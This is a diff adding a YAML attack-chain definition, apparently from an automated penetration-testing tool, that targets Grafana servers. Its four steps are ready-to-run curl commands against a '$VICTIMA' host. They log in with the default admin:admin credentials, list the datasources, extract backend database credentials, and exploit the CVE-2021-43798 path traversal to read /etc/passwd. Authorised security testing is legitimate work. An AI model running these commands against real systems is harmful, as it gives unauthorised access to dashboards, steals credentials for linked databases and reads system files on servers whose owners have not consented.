@@ -1,0 +1,40 @@
+chain_id: grafana_default_creds
+title: "Grafana — admin:admin default + datasource creds disclosure"
+severity: HIGH
+tags: [web, grafana, default-creds, datasource, disclosure]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)grafana" }
+    - { product_pattern: "(?i)grafana" }
+    - { path_pattern: "(?i)/grafana/|/api/datasources" }
+
+description: |
+  Grafana ships with `admin:admin` and prompts on first login — many
+  installations skip the prompt or change to a similarly-weak password.
+  Once authenticated, datasource configuration shows the credentials of
+  every linked Prometheus / MySQL / Postgres / Elasticsearch backend.
+
+steps:
+  - id: 1
+    title: "Default-cred probe"
+    command: |
+      curl -s -c cookies.txt -b cookies.txt -X POST -H 'Content-Type: application/json' \
+        -d '{"user":"admin","password":"admin"}' http://$VICTIMA:3000/login
+
+  - id: 2
+    title: "List datasources after login"
+    command: curl -s -b cookies.txt http://$VICTIMA:3000/api/datasources
+
+  - id: 3
+    title: "Pull datasource credentials (older Grafana < 8.0 — secureJsonData)"
+    command: |
+      curl -s -b cookies.txt http://$VICTIMA:3000/api/datasources/1 | jq
+
+  - id: 4
+    title: "CVE-2021-43798 path traversal (Grafana 8.0.0 - 8.3.0, unauth)"
+    command: |
+      curl --path-as-is "http://$VICTIMA:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
+
+references:
+  - https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
